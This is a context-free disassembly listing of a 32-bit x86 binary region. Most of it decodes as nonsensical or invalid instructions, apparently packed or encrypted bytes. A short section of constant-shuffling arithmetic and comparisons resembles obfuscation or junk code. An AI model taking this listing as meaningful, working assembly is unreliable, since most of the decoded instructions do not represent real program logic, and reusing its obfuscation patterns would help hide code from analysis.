  40bbc9:	inc    esi
  40bbca:	out    0xd3,al
  40bbcc:	or     eax,0x1ce312d3
  40bbd1:	pusha  
  40bbd2:	loop   0x40bc2f
  40bbd4:	loope  0x40bbfc
  40bbd6:	icebp  
  40bbd7:	push   ss
  40bbd8:	dec    ebx
  40bbd9:	jo     0x40bbba
  40bbdb:	aad    0xe5
  40bbdd:	add    al,0x5
  40bbdf:	out    0xea,eax
  40bbe1:	(bad)  
  40bbe3:	cld    
  40bbe4:	xchg   ebp,eax
  40bbe5:	mov    esi,fs
  40bbe7:	or     al,0xf4
  40bbe9:	inc    esp
  40bbea:	mov    eax,0xd616de17
  40bbef:	pop    ecx
  40bbf0:	loope  0x40bc2b
  40bbf2:	push   edx
  40bbf3:	mov    WORD PTR [ebx],ss
  40bbf5:	dec    ebp
  40bbf6:	nop
  40bbf7:	inc    esp
  40bbf8:	cwde   
  40bbf9:	dec    eax
  40bbfa:	cmp    eax,0x5d3de820
  40bbff:	xchg   ebp,eax
  40bc00:	sar    DWORD PTR [edi-0x1d8cf487],cl
  40bc06:	push   esp
  40bc07:	lock fistp WORD PTR [ebx]
  40bc0a:	sbb    eax,0xb22779c6
  40bc0f:	mov    dl,0xf3
  40bc11:	not    DWORD PTR [edx]
  40bc13:	xor    DWORD PTR [esi+0x2d],ebp
  40bc16:	ret    0x5dbc
  40bc19:	pop    ss
  40bc1a:	or     eax,0x30f72119
  40bc1f:	push   esp
  40bc20:	outs   dx,DWORD PTR ds:[esi]
  40bc21:	fisub  DWORD PTR [edx-0x5d]
  40bc24:	arpl   cx,cx
  40bc26:	xchg   esi,eax
  40bc27:	inc    edi
  40bc28:	or     al,0x14
  40bc2a:	jb     0x40bbe2
  40bc2c:	jp     0x40bca0
  40bc2e:	push   ss
  40bc2f:	and    eax,ebx
  40bc31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc32:	imul   eax,DWORD PTR [ebx+0x64],0xffffff8c
  40bc36:	test   BYTE PTR [ebp-0x5168066f],0xeb
  40bc3d:	aas    
  40bc3e:	sbb    DWORD PTR [ebp-0x24],ecx
  40bc41:	mov    bl,0xcd
  40bc43:	inc    eax
  40bc44:	jl     0x40bc8b
  40bc46:	or     BYTE PTR [ebp+0x67255ef1],ch
  40bc4c:	sub    al,0x62
  40bc4e:	cmp    al,0x2e
  40bc50:	jmp    0x1a59:0xf83125cd
  40bc57:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40bc59:	loopne 0x40bc0e
  40bc5b:	aas    
  40bc5c:	out    0xb1,eax
  40bc5e:	adc    DWORD PTR [esi+0x67ce6a34],ecx
  40bc64:	dec    esp
  40bc65:	in     eax,dx
  40bc66:	push   cs
  40bc67:	mul    DWORD PTR [ecx]
  40bc69:	push   ebx
  40bc6a:	dec    ecx
  40bc6b:	mov    edi,0x27cb6d36
  40bc70:	mov    eax,ds:0xe965492e
  40bc75:	sbb    DWORD PTR [esp+edi*8],eax
  40bc78:	sub    edi,DWORD PTR [ebx-0x609726cc]
  40bc7e:	xor    eax,0x8c7f5a84
  40bc83:	push   esi
  40bc84:	es ss (bad) 
  40bc88:	adc    DWORD PTR ds:0x99c20d5a,ebp
  40bc8e:	cwde   
  40bc8f:	mov    ebx,0x141961a0
  40bc94:	jnp    0x40bc7b
  40bc96:	inc    ebp
  40bc97:	out    0xec,eax
  40bc99:	(bad)  
  40bc9a:	call   0x2208a89c
  40bc9f:	pop    ebx
  40bca0:	ja     0x40bcdf
  40bca2:	mov    WORD PTR [edi-0x3e412852],?
  40bca8:	sahf   
  40bca9:	mov    dh,BYTE PTR [ebx-0x37]
  40bcac:	push   esp
  40bcad:	cmp    BYTE PTR [esi],dl
  40bcaf:	mov    ecx,0xd7b66427
  40bcb4:	xor    al,0x21
  40bcb6:	fcom   DWORD PTR [edx]
  40bcb8:	ja     0x40bcaf
  40bcba:	push   edi
  40bcbb:	dec    edi
  40bcbc:	push   ss
  40bcbd:	lods   al,BYTE PTR ds:[esi]
  40bcbe:	mov    ebx,0xe3d5d409
  40bcc3:	gs inc edx
  40bcc5:	and    BYTE PTR [edx],al
  40bcc7:	call   0x3554:0xb81cdb84
  40bcce:	mov    DWORD PTR [eax-0x7a],esi
  40bcd1:	shr    DWORD PTR [ebp-0x7b],cl
  40bcd4:	jmp    0xf3ca2e05
  40bcd9:	(bad)  
  40bcda:	shl    al,1
  40bcdc:	or     DWORD PTR [ecx-0x6560e3e],0x5b
  40bce3:	push   edx
  40bce4:	nop
  40bce5:	bound  esp,QWORD PTR [eax+0x4e]
  40bce8:	xor    DWORD PTR [eax+esi*2],ebp
  40bceb:	adc    al,0x53
  40bced:	pop    es
  40bcee:	mov    esp,0xda9f764
  40bcf3:	jmp    0xe928:0x8ae196b0
  40bcfa:	lods   al,BYTE PTR ds:[esi]
  40bcfb:	jae    0x40bcf3
  40bcfd:	mov    ecx,0x104da4cf
  40bd02:	nop
  40bd03:	push   ebx
  40bd04:	scas   al,BYTE PTR es:[edi]
  40bd05:	ds mov ecx,0xff21ece9
  40bd0b:	iret   
  40bd0c:	push   es
  40bd0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd0e:	mov    edx,0x4a42c595
  40bd13:	and    eax,0xc478a651
  40bd18:	stos   BYTE PTR es:[edi],al
  40bd19:	dec    edi
  40bd1a:	fsubr  st,st(4)
  40bd1c:	cld    
  40bd1d:	in     eax,dx
  40bd1e:	or     BYTE PTR [eax-0xed21fea],0x41
  40bd25:	xchg   ebp,eax
  40bd26:	add    DWORD PTR [ecx-0x68e4bab6],ebx
  40bd2c:	pop    ds
  40bd2d:	gs mov edi,0xb2cc4e00
  40bd34:	and    al,BYTE PTR [ebp+0xaa9008b]
  40bd3a:	sbb    DWORD PTR [edi*1-0x72e46831],ecx
  40bd41:	call   0x6391:0xb17e8c79
  40bd48:	inc    ecx
  40bd49:	mov    al,ds:0xf267f0e7
  40bd4e:	adc    esi,DWORD PTR ds:0x846d5e2f
  40bd54:	lods   al,BYTE PTR ds:[esi]
  40bd55:	sub    cl,al
  40bd57:	jge    0x40bd23
  40bd59:	or     ecx,DWORD PTR [esi-0x44]
  40bd5c:	out    dx,eax
  40bd5d:	pop    ebp
  40bd5e:	inc    eax
  40bd5f:	enter  0x7694,0xe5
  40bd63:	inc    eax
  40bd64:	das    
  40bd65:	jle    0x40bdc9
  40bd67:	mov    al,0x68
  40bd69:	push   ss
  40bd6a:	cdq    
  40bd6b:	sbb    BYTE PTR [edx],bl
  40bd6d:	loop   0x40bda5
  40bd6f:	inc    edx
  40bd70:	lods   eax,DWORD PTR ds:[esi]
  40bd71:	fdivrp st(5),st
  40bd73:	hlt    
  40bd74:	inc    ecx
  40bd75:	push   ds
  40bd76:	sbb    eax,0x15b2b518
  40bd7b:	inc    ebx
  40bd7c:	mov    ch,0x38
  40bd7e:	js     0x40bd39
  40bd80:	retf   
  40bd81:	ins    DWORD PTR es:[edi],dx
  40bd82:	xor    ebp,DWORD PTR [ecx]
  40bd84:	pop    ecx
  40bd85:	mov    es,ecx
  40bd87:	xor    al,0xd3
  40bd89:	mov    ecx,0x9d9cfc25
  40bd8e:	jmp    0xb6a40ba5
  40bd93:	mov    BYTE PTR [eax-0x2a],ah
  40bd96:	adc    edi,0x529f6af2
  40bd9c:	adc    al,0xed
  40bd9e:	sbb    eax,0x9d769d9d
  40bda3:	dec    ebp
  40bda4:	ret    0x8ac9
  40bda7:	jge    0x40be00
  40bda9:	aaa    
  40bdaa:	lds    edi,FWORD PTR [ebp+0x77]
  40bdad:	stos   BYTE PTR es:[edi],al
  40bdae:	jne    0x40bd54
  40bdb0:	mov    bh,0x5f
  40bdb2:	dec    ecx
  40bdb3:	push   ecx
  40bdb4:	int    0xc2
  40bdb6:	mov    edx,0xcd369654
  40bdbb:	add    DWORD PTR [edx+ecx*8],ebx
  40bdbe:	int3   
  40bdbf:	mov    ah,0xaf
  40bdc1:	div    DWORD PTR [edx]
  40bdc3:	gs loope 0x40bda4
  40bdc6:	cdq    
  40bdc7:	aam    0x30
  40bdc9:	(bad)  
  40bdca:	cmp    al,0xfb
  40bdcc:	repz xchg ebp,eax
  40bdce:	(bad)  
  40bdcf:	mov    cl,0xc6
  40bdd1:	mov    edx,?
  40bdd3:	or     BYTE PTR [eax+0x7b],0xff
  40bdd7:	push   esp
  40bdd8:	pop    ebx
  40bdd9:	xchg   esi,eax
  40bdda:	cmp    edx,esp
  40bddc:	rcr    dh,0xbd
  40bddf:	xor    eax,0xfdfbe6af
  40bde4:	xchg   ebx,eax
  40bde5:	jns    0x40bdb9
  40bde7:	imul   edx,DWORD PTR [esi+0x7f3077ef],0xbf79b43d
  40bdf1:	xor    bl,BYTE PTR [ebp+0xe4c8be8]
  40bdf7:	inc    eax
  40bdf8:	cs fistp QWORD PTR gs:[ecx]
  40bdfc:	scas   eax,DWORD PTR es:[edi]
  40bdfd:	in     al,0xc6
  40bdff:	mov    ds:0xa3e2f8db,eax
  40be04:	popa   
  40be05:	mov    edi,0x3e36d85a
  40be0a:	imul   esp,eax,0xffffff9c
  40be0d:	add    cl,BYTE PTR [ebx+0x7c]
  40be10:	call   DWORD PTR [esi-0x7e6e27cc]
  40be16:	jns    0x40be2c
  40be18:	push   ds
  40be19:	adc    dl,al
  40be1b:	shl    DWORD PTR [ecx],1
  40be1d:	ror    BYTE PTR [edi-0x7d],cl
  40be20:	cmp    DWORD PTR [edi],edi
  40be22:	dec    esi
  40be23:	leave  
  40be24:	xor    eax,DWORD PTR [ecx]
  40be26:	ret    0xa0eb
  40be29:	sahf   
  40be2a:	pushf  
  40be2b:	sub    edi,DWORD PTR [edx]
  40be2d:	out    0x5c,al
  40be2f:	lea    ebx,[eax]
  40be31:	lods   eax,DWORD PTR ds:[esi]
  40be32:	sbb    eax,0xda449386
  40be37:	push   edi
  40be38:	lock loope 0x40be71
  40be3b:	int3   
  40be3c:	std    
  40be3d:	gs gs popa 
  40be40:	into   
  40be41:	pop    esi
  40be42:	lds    eax,FWORD PTR [ebx-0x245ab3a]
  40be48:	lds    ebp,FWORD PTR [ecx+0x23a3d4f4]
  40be4e:	jbe    0x40be37
  40be50:	mov    bh,0x6
  40be52:	fist   WORD PTR [ebx-0x1aa92c55]
  40be58:	imul   ebx,DWORD PTR [edi+esi*2],0x418150cf
  40be5f:	aas    
  40be60:	dec    edx
  40be61:	adc    eax,0x202fd14a
  40be66:	jle    0x40beae
  40be68:	adc    ecx,DWORD PTR cs:[bx]
  40be6c:	pop    es
  40be6d:	shr    cl,0x1
  40be70:	sbb    eax,0x97897aed
  40be75:	xor    dh,dl
  40be77:	das    
  40be78:	push   ebx
  40be79:	fst    QWORD PTR [ebp-0x62]
  40be7c:	mov    WORD PTR [esi],cs
  40be7e:	dec    esi
  40be7f:	mov    BYTE PTR [ebx-0x52],ch
  40be82:	add    DWORD PTR [esi+edx*2-0x24],ebx
  40be86:	and    eax,0xf44d8955
  40be8b:	mov    DWORD PTR [ebp-0x20],0x4a50
  40be92:	mov    DWORD PTR [ebp-0x1c],0x2079
  40be99:	mov    DWORD PTR [ebp-0x28],0x792e
  40bea0:	mov    DWORD PTR [ebp-0x24],0x10e8
  40bea7:	mov    DWORD PTR [ebp-0x30],0x22b3
  40beae:	mov    DWORD PTR [ebp-0x2c],0x2293
  40beb5:	mov    eax,DWORD PTR [ebp-0x30]
  40beb8:	mov    ecx,DWORD PTR [ebp-0x2c]
  40bebb:	mov    edx,DWORD PTR [ebp-0x28]
  40bebe:	mov    esi,DWORD PTR [ebp-0x24]
  40bec1:	add    eax,edx
  40bec3:	mov    edx,DWORD PTR [ebp-0x20]
  40bec6:	adc    ecx,esi
  40bec8:	mov    esi,DWORD PTR [ebp-0x1c]
  40becb:	add    eax,0x3e60
  40bed0:	adc    ecx,0xd49e
  40bed6:	xor    eax,0x14ce
  40bedb:	xor    ecx,0x354f
  40bee1:	add    eax,edx
  40bee3:	mov    edx,DWORD PTR [ebp-0x10]
  40bee6:	adc    ecx,esi
  40bee8:	mov    esi,DWORD PTR [ebp-0xc]
  40beeb:	cmp    edx,eax
  40beed:	jne    0x40befb
  40bef3:	cmp    esi,ecx
  40bef5:	je     0x40cc06
  40befb:	mov    DWORD PTR [ebp-0x28],0x4db
  40bf02:	mov    DWORD PTR [ebp-0x24],0x233b
  40bf09:	mov    DWORD PTR [ebp-0x30],0x2c94
  40bf10:	push   0x6b33
  40bf15:	mov    DWORD PTR [ebp-0x2c],0x647f
  40bf1c:	mov    eax,DWORD PTR [ebp-0x30]
  40bf1f:	mov    ecx,DWORD PTR [ebp-0x2c]
  40bf22:	push   0x7c8f
  40bf27:	push   ecx
  40bf28:	push   eax
  40bf29:	call   0x416c20
  40bf2e:	mov    ecx,DWORD PTR [ebp-0x28]
  40bf31:	mov    esi,DWORD PTR [ebp-0x24]
  40bf34:	push   0x4e1a18a
  40bf39:	push   0x283cdcc
  40bf3e:	and    edx,esi
  40bf40:	and    eax,ecx
  40bf42:	push   edx
  40bf43:	jmp    0x40c339
  40bf48:	fst    DWORD PTR [ebp-0x17]
  40bf4b:	or     eax,0x4c9c1c65
  40bf50:	push   ds
  40bf51:	jp     0x40bede
  40bf53:	jo     0x40bf0c
  40bf55:	add    cl,bl
  40bf57:	mov    esp,0x181805b6
  40bf5c:	outs   dx,BYTE PTR ds:[esi]
  40bf5d:	adc    bl,BYTE PTR [eax]
  40bf5f:	sbb    BYTE PTR [ecx-0x44],cl
  40bf62:	or     eax,0xea71dee1
  40bf67:	mov    ah,0xd1
  40bf69:	mov    es,WORD PTR [ebp+0x7657f48b]
  40bf6f:	mov    ds:0xa658c3cd,eax
  40bf74:	and    al,0xce
  40bf76:	push   eax
  40bf77:	jge    0x40bf0a
  40bf79:	dec    BYTE PTR [ebp-0x474002e8]
  40bf7f:	xor    BYTE PTR [esi+0x69],dh
  40bf82:	outs   dx,BYTE PTR ds:[esi]
  40bf83:	inc    eax
  40bf85:	pop    ds
  40bf86:	and    ch,BYTE PTR [ebx-0xf8b2b59]
  40bf8c:	mov    ch,0xe5
  40bf8e:	xlat   BYTE PTR ds:[ebx]
  40bf8f:	pop    eax
  40bf90:	ins    BYTE PTR es:[edi],dx
  40bf91:	jno    0x40c005
  40bf93:	mov    edx,0x7f9b4424
  40bf98:	scas   al,BYTE PTR es:[edi]
  40bf99:	lods   al,BYTE PTR ds:[esi]
  40bf9a:	or     BYTE PTR ds:0x44e4e8b0,0x59
  40bfa1:	test   eax,0x6dddd45e
  40bfa6:	retf   0xba1c
  40bfa9:	push   ecx
  40bfaa:	xchg   ebp,eax
  40bfab:	mov    ds:0x3b7ccdaa,eax
  40bfb0:	out    dx,eax
  40bfb1:	push   esi
  40bfb2:	daa    
  40bfb3:	fucom  st(6)
  40bfb5:	jns    0x40bfe4
  40bfb7:	retf   0xcbff
  40bfba:	sub    dh,al
  40bfbc:	sub    BYTE PTR [ebx+0x5a3fbcc8],dh
  40bfc2:	inc    esi
  40bfc3:	mov    dh,0xf2
  40bfc5:	sub    BYTE PTR [eax+0x49],cl
  40bfc8:	dec    edx
  40bfc9:	dec    esp
  40bfca:	retf   0xcb1a
  40bfcd:	mov    bh,0x1e
  40bfcf:	pop    edi
  40bfd0:	int    0xae
  40bfd2:	or     esp,DWORD PTR [ebx]
  40bfd4:	(bad)  
  40bfd5:	retf   
  40bfd6:	xchg   ebp,eax
  40bfd7:	cmp    cl,dh
  40bfd9:	dec    esp
  40bfda:	push   es
  40bfdb:	leave  
  40bfdc:	loopne 0x40c05c
  40bfde:	adc    bh,BYTE PTR [ebx+eax*1-0x19007e07]
  40bfe5:	fisub  DWORD PTR [ebp+0x5f]
  40bfe8:	repz and BYTE PTR [ecx],bl
  40bfeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfec:	mov    bh,BYTE PTR [ebx]
  40bfee:	jb     0x40bfb0
  40bff0:	pop    ds
  40bff1:	ret    
  40bff2:	lods   eax,DWORD PTR ds:[esi]
  40bff3:	ret    
  40bff4:	jle    0x40c02f
  40bff6:	ret    0x6526
  40bff9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bffa:	stc    
  40bffb:	aam    0x10
  40bffd:	cmp    bl,BYTE PTR [eax-0x56c7339e]
  40c003:	cmp    al,0xec
  40c005:	adc    BYTE PTR [edi],ch
  40c007:	fs data16 test al,0x57
  40c00b:	dec    ebx
  40c00d:	inc    edi
  40c00e:	mov    bh,0xb5
  40c010:	popf   
  40c011:	jnp    0x40c01c
  40c013:	lods   eax,DWORD PTR ds:[esi]
  40c014:	adc    esi,ebx
  40c016:	idiv   bl
  40c018:	sub    DWORD PTR [bp+di],0x175230d8
  40c01f:	test   al,0x1f
  40c021:	add    BYTE PTR [esi],al
  40c023:	sbb    dh,BYTE PTR [ebx+ebx*2]
  40c026:	jle    0x40c077
  40c028:	pop    edx
  40c029:	jae    0x40c0a3
  40c02b:	lds    eax,FWORD PTR [ecx+0x3a297609]
  40c031:	xchg   ecx,eax
  40c032:	mov    ebp,0xac0aa127
  40c037:	push   esi
  40c038:	mov    eax,eax
  40c03a:	sbb    al,0xe1
  40c03c:	imul   ecx,DWORD PTR [ecx],0x3ca42c25
  40c042:	imul   esi,ebx,0x3f276e7c
  40c048:	inc    esi
  40c049:	jno    0x40c022
  40c04b:	(bad)  
  40c04c:	dec    eax
  40c04d:	sub    eax,0x2d350da0
  40c052:	ret    0xe4ad
  40c055:	pop    edi
  40c056:	aas    
  40c057:	mov    BYTE PTR [esi-0x1ff45d0b],ch
  40c05d:	inc    eax
  40c05e:	or     bl,BYTE PTR [edx]
  40c060:	imul   edi,DWORD PTR [ebx+0x12bcf122],0xffffffcd
  40c067:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c068:	(bad)  
  40c069:	(bad)  
  40c06a:	jp     0x40c0e6
  40c06c:	cwde   
  40c06d:	gs iret 
  40c06f:	sbb    ebp,DWORD PTR [ebp+edi*8+0x58]
  40c073:	jo     0x40c0b5
  40c075:	and    ebp,esp
  40c077:	cmp    al,0xb4
  40c079:	shr    BYTE PTR [ebp+0x4e],1
  40c07c:	daa    
  40c07d:	fucomp st(7)
  40c07f:	xor    ecx,DWORD PTR [ebx+0x75a82fe8]
  40c085:	xor    al,0x59
  40c087:	dec    esi
  40c088:	jl     0x40c07b
  40c08a:	idiv   BYTE PTR [eax]
  40c08c:	mov    al,0x9d
  40c08e:	je     0x40c044
  40c090:	stos   DWORD PTR es:[edi],eax
  40c091:	les    esi,FWORD PTR [ecx]
  40c093:	(bad)  
  40c095:	xor    bl,BYTE PTR [edi+0x38]
  40c098:	sub    eax,DWORD PTR [edx+0x6a]
  40c09b:	rcr    BYTE PTR [ecx+0x5aa282f6],cl
  40c0a1:	(bad)  
  40c0a4:	xor    al,0x15
  40c0a6:	push   ecx
  40c0a7:	pop    eax
  40c0a8:	(bad)  
  40c0a9:	cwde   
  40c0aa:	xor    DWORD PTR [ecx],esp
  40c0ac:	cs push 0x58
  40c0af:	sbb    al,0x2a
  40c0b1:	retf   
  40c0b2:	bound  edi,QWORD PTR [edi]
  40c0b4:	(bad)  
  40c0b5:	mov    eax,0x76cd1e4c
  40c0ba:	imul   eax,DWORD PTR [ebx-0x5e1fe7ae],0xd8175ce3
  40c0c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0c5:	jl     0x40c0dd
  40c0c7:	int3   
  40c0c8:	adc    eax,0x2e85fc73
  40c0cd:	or     al,0x23
  40c0cf:	repnz fcmovnb st,st(6)
  40c0d2:	out    0x60,eax
  40c0d4:	pop    ss
  40c0d5:	add    al,0xac
  40c0d7:	pop    esp
  40c0d8:	xchg   BYTE PTR [esi*8+0x5ae46290],dl
  40c0df:	pop    ds
  40c0e0:	das    
  40c0e1:	adc    DWORD PTR [eax+0x7],ebp
  40c0e4:	mov    ebx,esi
  40c0e6:	sub    al,0xfa
  40c0e8:	and    DWORD PTR [edi-0x36],edx
  40c0eb:	or     eax,0xb872d5d0
  40c0f0:	inc    esp
  40c0f1:	test   al,0xda
  40c0f3:	sbb    BYTE PTR [edi+0x7b6b4029],ah
  40c0f9:	pop    edx
  40c0fa:	aaa    
  40c0fb:	add    ch,BYTE PTR [esi]
  40c0fd:	adc    eax,0xc79deeb8
  40c102:	data16 (bad) 
  40c106:	inc    ecx
  40c107:	pop    ebp
  40c108:	fwait
  40c109:	aam    0xde
  40c10b:	adc    ecx,DWORD PTR [edi+edx*4]
  40c10e:	ficom  DWORD PTR [edx+0x5d]
  40c111:	in     al,0x20
  40c113:	pop    ebx
  40c114:	pushf  
  40c115:	push   ds
  40c116:	rcr    ebp,0x5b
  40c119:	cli    
  40c11a:	inc    ebp
  40c11b:	mov    esp,0xdb211f56
  40c120:	cmp    esi,DWORD PTR [edx]
  40c122:	mov    ch,0x17
  40c124:	push   es
  40c125:	add    DWORD PTR [ecx+0x6b],ecx
  40c128:	pop    ecx
  40c129:	mov    esp,0xd36e4301
  40c12e:	hlt    
  40c12f:	loopne 0x40c1a2
  40c131:	call   0xeedd:0xce17f37d
  40c138:	lds    eax,FWORD PTR [esi]
  40c13a:	add    al,BYTE PTR [edx-0x2a]
  40c13d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c13e:	pusha  
  40c13f:	bound  esp,QWORD PTR [esi]
  40c141:	daa    
  40c142:	dec    ecx
  40c143:	xor    eax,0xfc650063
  40c148:	pop    ecx
  40c149:	sbb    eax,0x2e31a18a
  40c14e:	lods   al,BYTE PTR ds:[esi]
  40c14f:	pop    esi
  40c150:	mov    esp,0x2651433a
  40c155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c156:	(bad)  
  40c158:	mov    edi,0x3800e978
  40c15d:	dec    esi
  40c15e:	gs test eax,0x1fd2ac7b
  40c164:	in     eax,dx
  40c165:	sbb    al,0xc8
  40c167:	push   edi
  40c168:	lods   al,BYTE PTR ds:[esi]
  40c169:	(bad)  
  40c16a:	xchg   BYTE PTR [ebx],cl
  40c16c:	xor    eax,DWORD PTR [ebx+0x60f64189]
  40c172:	fs jns 0x40c124
  40c175:	cli    
  40c176:	pop    ebx
  40c177:	xchg   edi,eax
  40c178:	out    dx,al
  40c179:	sub    BYTE PTR [edi-0x54c3c870],bl
  40c17f:	jl     0x40c117
  40c181:	push   0x56e3e860
  40c186:	and    al,0xe3
  40c188:	mov    esi,DWORD PTR [edx]
  40c18a:	cmp    DWORD PTR [edi-0x42b0ff51],0x366881b2
  40c194:	push   esi
  40c195:	inc    esi
  40c196:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c197:	shl    dh,1
  40c199:	ds dec ebp
  40c19b:	test   dh,bh
  40c19d:	loop   0x40c212
  40c19f:	into   
  40c1a0:	call   0x1ff86ee3
  40c1a5:	dec    edx
  40c1a6:	ins    DWORD PTR es:[edi],dx
  40c1a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1a8:	call   0x2b690df8
  40c1ad:	mov    al,ds:0x421dcbca
  40c1b2:	cli    
  40c1b3:	loope  0x40c1e2
  40c1b5:	pop    esi
  40c1b6:	sbb    DWORD PTR [ebp+0x3c],0xffffff91
  40c1ba:	in     al,0x1f
  40c1bc:	call   0xd478:0x9a11310e
  40c1c3:	mov    ebx,0xb760cc95
  40c1c8:	pop    es
  40c1c9:	out    dx,al
  40c1ca:	fstp   st(1)
  40c1cc:	xchg   edi,eax
  40c1cd:	add    BYTE PTR ss:[edi],cl
  40c1d0:	daa    
  40c1d1:	out    dx,al
  40c1d2:	mov    dh,0x90
  40c1d4:	fist   WORD PTR [ebx]
  40c1d6:	(bad)  
  40c1d7:	jmp    0xe1a21fcc
  40c1dc:	leave  
  40c1dd:	and    BYTE PTR [esi],dh
  40c1df:	sahf   
  40c1e0:	(bad)  
  40c1e1:	(bad)  
  40c1e2:	push   esi
  40c1e3:	mov    dl,0x3
  40c1e5:	xor    eax,0xccbbc04c
  40c1ea:	xchg   esp,eax
  40c1eb:	mov    bl,0xc1
  40c1ed:	call   0x7863c260
  40c1f2:	shr    DWORD PTR [ebx+0x31993007],cl
  40c1f8:	sar    BYTE PTR [ebx-0x51],0x9c
  40c1fc:	stc    
  40c1fd:	ja     0x40c25c
  40c1ff:	fcmovbe st,st(0)
  40c201:	mov    eax,ds:0xbf081af
  40c206:	pop    eax
  40c207:	sbb    ebp,DWORD PTR [ebp+0x31]
  40c20a:	aad    0x33
  40c20c:	pop    ss
  40c20d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c20e:	shl    ch,0xaa
  40c211:	(bad)  
  40c212:	stos   DWORD PTR es:[edi],eax
  40c213:	mov    WORD PTR [eax+0x19288c9],cs
  40c219:	xor    al,0x93
  40c21b:	rcl    DWORD PTR [eax-0x34a49df9],cl
  40c221:	inc    edi
  40c222:	and    edx,DWORD PTR [ecx]
  40c224:	lods   eax,DWORD PTR ds:[esi]
  40c225:	cmp    bl,BYTE PTR [ebp+0x28]
  40c228:	das    
  40c229:	jmp    0x605b:0x3cee18b2
  40c230:	jns    0x40c1cd
  40c232:	push   esp
  40c233:	or     bh,BYTE PTR [eax-0x39]
  40c236:	mov    al,0x1d
  40c238:	pop    ss
  40c239:	xor    cl,BYTE PTR [esp+edx*4]
  40c23c:	clc    
  40c23d:	(bad)  
  40c23e:	cmp    edi,DWORD PTR [ecx+edi*2]
  40c241:	adc    al,0x5c
  40c243:	aad    0xd9
  40c245:	or     BYTE PTR [ecx],bh
  40c247:	das    
  40c248:	xor    ebx,ecx
  40c24a:	sbb    al,0x2a
  40c24c:	out    0x83,al
  40c24e:	dec    ecx
  40c24f:	jnp    0x40c2a4
  40c251:	sbb    ebx,DWORD PTR [ebp+0x3b]
  40c254:	mov    esi,0x340af0ff
  40c259:	int3   
  40c25a:	pop    es
  40c25b:	fild   WORD PTR [esi]
  40c25d:	int    0x8f
  40c25f:	int    0x2c
  40c261:	pusha  
  40c262:	data16 ficom DWORD PTR [edi-0x7a]
  40c266:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c267:	iret   
  40c268:	rcl    DWORD PTR [edx],0xbb
  40c26b:	mov    al,ds:0x3ea1d45f
  40c270:	(bad)
  40c274:	sar    DWORD PTR [ebp+0x738fe6de],1
  40c27a:	xchg   ecx,eax
  40c27b:	xor    DWORD PTR [edx],esi
  40c27d:	push   edx
  40c27e:	scas   al,BYTE PTR es:[edi]
  40c27f:	idiv   BYTE PTR [edi]
  40c281:	push   es
  40c282:	jmp    0x8ff1:0x562c8ea4
  40c289:	xor    al,0xfe
  40c28b:	jge    0x40c296
  40c28d:	sub    ch,cl
  40c28f:	cmp    esi,edx
  40c291:	adc    ebp,DWORD PTR [eax]
  40c293:	cli    
  40c294:	cdq    
  40c295:	cmp    edi,DWORD PTR [edi]
  40c297:	repnz das 
  40c299:	jno    0x40c25c
  40c29b:	xor    eax,0x658f53df
  40c2a0:	cmp    DWORD PTR [ecx-0x79],0x535c324a
  40c2a7:	leave  
  40c2a8:	sbb    al,0xd1
  40c2aa:	scas   eax,DWORD PTR es:[edi]
  40c2ab:	xor    BYTE PTR [ecx],0xf
  40c2ae:	ins    BYTE PTR es:[edi],dx
  40c2af:	xchg   DWORD PTR ds:0x25d50397,edx
  40c2b5:	add    eax,0xa01e448f
  40c2ba:	retf   
  40c2bb:	out    dx,eax
  40c2bc:	sar    DWORD PTR [edx],0x74
  40c2bf:	push   ds
  40c2c0:	fisttp DWORD PTR [edx+ebx*1-0x15d19bb0]
  40c2c7:	dec    eax
  40c2c8:	rcr    cl,1
  40c2ca:	mov    ebx,0xcea1324a
  40c2cf:	(bad)  
  40c2d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2d2:	push   esp
  40c2d3:	and    DWORD PTR [eax],ecx
  40c2d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2d6:	xchg   DWORD PTR [ecx-0x1c],ebx
  40c2d9:	pop    ss
  40c2da:	sbb    BYTE PTR ds:0xb807645b,dl
  40c2e0:	cld    
  40c2e1:	inc    ebx
  40c2e2:	int    0x7d
  40c2e4:	mov    ah,0x13
  40c2e6:	idiv   BYTE PTR [eax+0x644d5833]
  40c2ec:	jl     0x40c274
  40c2ee:	adc    BYTE PTR [ebx+eax*8],bh
  40c2f1:	jge    0x40c365
  40c2f3:	shl    BYTE PTR [eax-0x249e7526],1
  40c2f9:	xchg   ebp,eax
  40c2fa:	inc    ebp
  40c2fb:	ret    0xa73
  40c2fe:	sub    BYTE PTR [esi],dh
  40c300:	ror    BYTE PTR [eax+ebp*2+0x56],cl
  40c304:	mov    esi,0x32b76ac2
  40c309:	ss stc 
  40c30b:	add    DWORD PTR [edx+0x4bb04216],ebp
  40c311:	jp     0x40c310
  40c313:	add    DWORD PTR [ecx+0x39],ebx
  40c316:	and    dh,dl
  40c318:	(bad)  
  40c319:	aam    0x3f
  40c31b:	aam    0x1
  40c31d:	push   esi
  40c31e:	(bad)  
  40c320:	xor    DWORD PTR [edx-0x61],0x36f70f8f
  40c327:	popf   
  40c328:	or     eax,0xbbe01482
  40c32d:	div    BYTE PTR [esi-0x6abbb7e9]
  40c333:	lea    ebp,[esi+0x7d]
  40c336:	sub    BYTE PTR [eax],al
  40c338:	call   0x0:0xa8e1e850
  40c33f:	xor    eax,0x687b
  40c344:	xor    edx,0x18d4
  40c34a:	mov    DWORD PTR [ebp-0x30],eax
  40c34d:	mov    DWORD PTR [ebp-0x2c],edx
  40c350:	mov    eax,ds:0x4227ac
  40c355:	cmp    eax,0x7cd80819
  40c35a:	jne    0x40cc06
  40c360:	mov    eax,DWORD PTR [ebp-0x18]
